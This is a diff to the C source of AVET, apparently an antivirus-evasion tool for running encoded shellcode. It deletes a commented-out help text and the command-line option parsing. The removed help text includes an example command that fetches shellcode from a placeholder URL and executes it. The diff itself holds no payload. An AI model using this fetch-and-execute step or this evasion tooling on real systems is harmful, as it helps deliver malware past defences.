@@ -4,21 +4,6 @@ License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
 Web: https://github.com/govolution/avet
  */
 
-/*
-   void print_help()
-   {
-   printf("avet.exe: Tool for executing, encoding and decoding shellcode in a text file\n\n");
-   printf("The shellcode file is derived from a shellcode in c format, for example from msfpayload and converted with a simple sh-script, like this:\n\n");
-   printf("Options:\n");
-//   printf("-f exec shellcode from file, needs filename\n");
-   printf("-u load and exec shellcode from url using internet explorer\n");
-   printf("-p print debug information\n");
-   printf("Example usage:\n");
-   printf("avet.exe -u http://myserver.com/sh.txt -p\n");
-   printf("avet.exe -f shellcode.txt\n");
-   }
- */
-
 //     "         .==,_                                          \n"
 //     "        .===,_`\\                                        \n"
 //     "      .====,_ ` \\      .====,__                         \n"
@@ -70,36 +55,6 @@ int main (int argc, char **argv)
 #ifdef LVALUE
 fvalue=argv[1];
 #endif
-
-	// compute the options
-	while ((c = getopt (argc, argv, "u:p")) != -1)
-		switch (c)
-		{
-			/*
-			case 'f':
-				fvalue = optarg;
-				break;
-			case 'u':
-				uvalue = optarg;
-				break;
-			
-			case 'p':
-				print_debug = 1;
-				break;
-*/
-			case '?':
-				if (optopt == 'f')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-				else if (optopt == 'u')
-					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
-				else if (isprint (optopt))
-					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
-				else
-					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
-				return 1;
-			default:
-				abort ();
-		}
 
 #ifdef PRINT_DEBUG
 		printf ("fvalue = %s ", fvalue);
